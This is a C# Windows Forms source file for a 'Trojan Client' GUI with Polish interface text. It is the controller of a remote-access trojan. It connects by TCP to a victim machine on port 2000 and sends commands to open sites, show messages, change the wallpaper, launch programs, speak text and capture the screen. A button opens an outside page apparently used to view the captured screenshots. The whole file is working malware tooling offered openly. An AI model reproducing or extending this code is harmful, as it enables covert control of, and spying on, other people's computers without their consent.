using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;


namespace Trojan_client_GUI
{
    public partial class Form1 : Form
    {
        public static bool IsConnected;
        public static NetworkStream Writer;

        public Form1()
        {
            InitializeComponent();
            toolStripStatusLabel1.Text = "Trojan Client - Niepodłączony";
                     
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //This is the TcpClient; we will use this for the connection.

            TcpClient Connector = new TcpClient();

            //If you can't connect, it takes you back here to try again.
            

            //Get the user to enter the IP of the server.
            

            string IP = Convert.ToString(textBox1.Text);

            //Attempt to connect; use a try...catch statement to avoid crashes.

            try
            {

                //Connect to the specified IP on port 80(the port the trojan server uses!)

                Connector.Connect(IP, 2000);

                //So the program continues to receive commands.

                IsConnected = true;

                //Changes the console title to "Shockwave Trojan Client - Online"

                toolStripStatusLabel1.Text = "Trojan Client - Podłączony";

                //Make Writer the stream coming from / going to Connector.

                Writer = Connector.GetStream();

                //We connected!
                toolStripStatusLabel2.Text="Połączyłeś się z serwerem o IP: " + IP + ".";
                

            }

            catch
            {

                //We couldn't connect :-(

                toolStripStatusLabel1.Text="Problem z podłączeniem do SERWERA";
                toolStripStatusLabel2.Text = "";
                IsConnected = false;
                //Go back and start again           
                

            }
            //Let user know they connected and that if they type HELP they'll get a list of commands to use.
            if (IsConnected == true)
            {
                pictureBox1.Visible = true;
                pictureBox2.Visible = false;
            }
            else
            {
                pictureBox1.Visible = false;
                pictureBox2.Visible = true;
            }
            

        }


        private void button2_Click(object sender, EventArgs e)
        {
            //While you're connected to the server

            if (IsConnected == true)
            {

                string CMD = textBox2.Text + "---" + textBox5.Text;
                SendCommand(CMD);


            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (IsConnected == true)
            {

                string CMD = "OPENSITE---" + textBox3.Text + "---" + textBox6.Text;
                SendCommand(CMD); 

            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            if (IsConnected == true)
            {

                string CMD = "MESSAGE---" + textBox4.Text + "---" + textBox7.Text;
                SendCommand(CMD);

            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            if (IsConnected == true)
            {
                string CMD = "BEEP---" + textBox8.Text;
                SendCommand(CMD);

            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            if (IsConnected == true)
            {
                string CMD = "TAPETA---" + textBox9.Text;
                SendCommand(CMD);

            }
        }
        
      
        public static void SendCommand(string Command)
        {
            //Try to send

            try
            {
                //Creates a packet to hold the command

                byte[] Packet = Encoding.ASCII.GetBytes(Command);

                //Send the command over the network

                Writer.Write(Packet, 0, Packet.Length);

                //Flush out any extra data that didn't send in the start.

                Writer.Flush();

            }

            catch
            {

                //Couldn't send, so we aren't connected anymore!

                IsConnected = false;

               // toolStripStatusLabel1.Text = "Disconnected from server!";

                //Close the connection.

                Writer.Close();

            }
        }

        private void button7_Click(object sender, EventArgs e)
        {
            if (IsConnected == true)
            {
                string CMD = "calc.exe" + "---" + textBox10.Text;
                SendCommand(CMD);

            }
        }

        private void button8_Click(object sender, EventArgs e)
        {
            if (IsConnected == true)
            {
                string CMD = "mspaint.exe" + "---" + textBox10.Text;
                SendCommand(CMD);

            }
        }

        private void button9_Click(object sender, EventArgs e)
        {
            if (IsConnected == true)
            {
                string CMD = "notepad.exe" + "---" + textBox10.Text;
                SendCommand(CMD);

            }
        }

        private void button10_Click(object sender, EventArgs e)
        {
            if (IsConnected == true)
            {
                string CMD = "wordpad.exe" + "---" + textBox10.Text;
                SendCommand(CMD);

            }
        }

        private void button11_Click(object sender, EventArgs e)
        {
            if (IsConnected == true)
            {
                string CMD = "explorer.exe" + "---" + textBox10.Text;
                SendCommand(CMD);

            }
        }

        private void button12_Click(object sender, EventArgs e)
        {
            if (IsConnected == true)
            {
                string CMD = "IEXPLORE.EXE" + "---" + textBox10.Text;
                SendCommand(CMD);

            }
        }

        private void button13_Click(object sender, EventArgs e)
        {
            if (IsConnected == true)
            {
                string CMD = "winmine.exe" + "---" + textBox10.Text;
                SendCommand(CMD);

            }
        }

        private void button14_Click(object sender, EventArgs e)
        {
            if (IsConnected == true)
            {
                string CMD = "sol.exe" + "---" + textBox10.Text;
                SendCommand(CMD);

            }
        }

        private void button15_Click(object sender, EventArgs e)
        {
            if (IsConnected == true)
            {
                string CMD = "wab.exe" + "---" + textBox10.Text;
                SendCommand(CMD);

            }
        }

        private void button16_Click(object sender, EventArgs e)
        {
            if (IsConnected == true)
            {
                string CMD = "wmplayer.exe" + "---" + textBox10.Text;
                SendCommand(CMD);

            }
        }

        private void button17_Click(object sender, EventArgs e)
        {
            if (IsConnected == true)
            {
                string CMD = "moviemk.exe" + "---" + textBox10.Text;
                SendCommand(CMD);

            }
        }

        private void button18_Click(object sender, EventArgs e)
        {
            if (IsConnected == true)
            {
                string CMD = "msmsgs.exe" + "---" + textBox10.Text;
                SendCommand(CMD);

            }
        }

        private void button19_Click(object sender, EventArgs e)
        {
            if (IsConnected == true)
            {
                string CMD = "msimn.exe" + "---" + textBox10.Text;
                SendCommand(CMD);

            }
        }

        private void button20_Click(object sender, EventArgs e)
        {
            if (IsConnected == true)
            {
                string CMD = "msinfo32.exe" + "---" + textBox10.Text;
                SendCommand(CMD);

            }
        }

        private void button21_Click(object sender, EventArgs e)
        {
            if (IsConnected == true)
            {
                string CMD = "wscui.cpl" + "---" + textBox10.Text;
                SendCommand(CMD);

            }
        }

        private void button22_Click(object sender, EventArgs e)
        {
            if (IsConnected == true)
            {
                string CMD = "MOW" + "---" + textBox4.Text + "---" + textBox7.Text;
                SendCommand(CMD);

            }
        }

        private void pomocToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form2 okno = new Form2();
            okno.Show();

        }

        private void oTrojanClientGUIToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AboutBox1 okno = new AboutBox1();
            okno.Show();
        }

        private void button23_Click(object sender, EventArgs e)
        {
            if (IsConnected == true)
            {
                string CMD = "SCREEN" + "---" ;
                SendCommand(CMD);

            }
        }



        private void button24_Click_1(object sender, EventArgs e)
        {
            string Site = "http://eros.vlo.gda.pl/~wnk99/trojan/zdj.html";
            System.Diagnostics.Process IE = new System.Diagnostics.Process();

            IE.StartInfo.FileName = "iexplore.exe";

            IE.StartInfo.Arguments = Site.Trim('\0');

            IE.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;

            IE.Start();
        }


    }
}










